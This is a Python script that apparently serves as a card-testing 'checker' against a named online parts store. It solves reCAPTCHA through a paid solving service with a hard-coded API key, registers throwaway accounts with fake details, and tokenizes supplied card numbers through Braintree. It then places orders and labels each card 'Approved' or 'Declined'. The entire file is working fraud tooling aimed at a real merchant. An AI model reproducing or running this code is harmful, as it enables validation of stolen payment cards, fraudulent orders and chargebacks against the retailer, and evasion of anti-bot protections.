import requests
import re
import base64
import json
import names
import random
from fake_useragent import UserAgent
import time
import uuid

def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

api_key = 'CAP-67353EC3E4DFB872C3C8161C3BF5CC189BBFE1785788306C20D66BFB6DD51F4C'

def capsolver(site_key,site_url,type):
    payload = {
        "clientKey": api_key,
        "task": {
            "type": type,
            "websiteKey": site_key,
            "websiteURL": site_url
        }
    }
    try:
        res = requests.post("https://api.capsolver.com/createTask", json=payload, timeout=30)
        resp = res.json()
        task_id = resp.get("taskId")
        if not task_id:
            return None

        for _ in range(20): # max 60 seconds
            time.sleep(3)
            payload = {"clientKey": api_key, "taskId": task_id}
            res = requests.post("https://api.capsolver.com/getTaskResult", json=payload, timeout=30)
            resp = res.json()
            status = resp.get("status")
            if status == "ready":
                return resp.get("solution", {}).get('gRecaptchaResponse')
            if status == "failed" or resp.get("errorId"):
                return None
    except:
        return None
    return None

class payflowchgr:
    def __init__(self, card_str):
        self.card_str = card_str
        parts = card_str.split('|')
        self.cc = parts[0] if len(parts) > 0 else ""
        self.mes = parts[1] if len(parts) > 1 else ""
        self.ano = parts[2] if len(parts) > 2 else ""
        self.cvv = parts[3] if len(parts) > 3 else ""

    def main(self):
        try:
            session = requests.session()
            Agent = UserAgent().random
            CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': Agent,
            }

            # 1. Visit product page
            session.get('https://www.anfittingsdirect.com/an-fittings/water-to-air-fittings-p-992.html', headers=headers, timeout=30)
            
            # 2. Add to cart
            data = {'products_id': '992', 'cart_quantity': '1'}
            session.post('https://www.anfittingsdirect.com/shopping_cart.php?action=add_product', headers=headers, data=data, timeout=30)
            
            # 3. Visit shopping cart to get token
            cart_resp = session.get('https://www.anfittingsdirect.com/shopping_cart.php', headers=headers, timeout=30).text
            
            # Improved regex for authorization token
            match = re.search(r"authorization:\s*'([^']+)'", cart_resp)
            if not match:
                # Try alternative regex
                match = re.search(r"client_token:\s*'([^']+)'", cart_resp)
                
            if not match:
                return "Error", "Authorization token not found on cart page"
                
            token = match.group(1)
            try:
                decode = base64.b64decode(token)
                decode_string = decode.decode("utf-8")
                json_data = json.loads(decode_string)   
                bearer = json_data.get('authorizationFingerprint')
            except:
                # If decoding fails, maybe it's already the bearer or a different format
                bearer = token

            # 4. Captcha & Create Account
            cap = capsolver('6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY', 'https://www.anfittingsdirect.com/create_account.php', 'ReCaptchaV2TaskProxyLess')
            if not cap:
                return "Error", "Captcha solving failed"

            data = f'action=process&firstname=ldfl&lastname=dsdasd&street_address=calle3&suburb=sadw&city=Ciudad+de+M%E9xico&state=43&postcode=10080&country=223&telephone=%2B10989861371&email_address={CorreoRand}&password=leito132asd&confirmation=leito132asd&g-recaptcha-response={cap}'
            session.post('https://www.anfittingsdirect.com/create_account.php', headers=headers, data=data, timeout=30)

            # 5. Checkout Steps
            session.get('https://www.anfittingsdirect.com/checkout_shipping.php', headers=headers, timeout=30)
            session.get('https://www.anfittingsdirect.com/checkout_payment.php', headers=headers, timeout=30)

            # 6. Braintree Tokenize
            bt_headers = {
                'accept': '*/*',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'user-agent': Agent,
            }
            bt_data = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'dropin2', 'sessionId': str(uuid.uuid4())},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                'variables': {
                    'input': {
                        'creditCard': {'number': self.cc, 'expirationMonth': self.mes, 'expirationYear': self.ano, 'cvv': self.cvv},
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            res = session.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=bt_data, timeout=30).json()
            
            if 'data' not in res or 'tokenizeCreditCard' not in res['data']:
                return "Error", f"Braintree tokenization failed: {json.dumps(res)}"
                
            toke1 = res['data']['tokenizeCreditCard']['token']

            # 7. Final Order
            order_data = {
                'action': 'process', 'shipping': 'table_table', 'payment': 'braintree_jh_creditcard',
                'btjh_credit_card_nonce': toke1, 'accept_terms': '1', 'user_clicked_complete_order': 'COMPLETE ORDER',
            }
            session.post('https://www.anfittingsdirect.com/checkout_payment.php', headers=headers, data=order_data, timeout=30)
            session.get('https://www.anfittingsdirect.com/checkout_process.php', headers=headers, timeout=30)
            
            final_resp = session.get('https://www.anfittingsdirect.com/checkout_payment.php', headers=headers, timeout=30).text
            
            if "Your order has been processed" in final_resp or "Thank you" in final_resp:
                return "Approved! ✅", "Transaction Successful"
            
            # Extract error message
            err_msg = paserX(final_resp, 'class="messageStackError">', '</td>')
            if not err_msg:
                err_msg = "Declined"
            return "Declined! ❌", err_msg

        except Exception as e:
            return "Error", str(e)
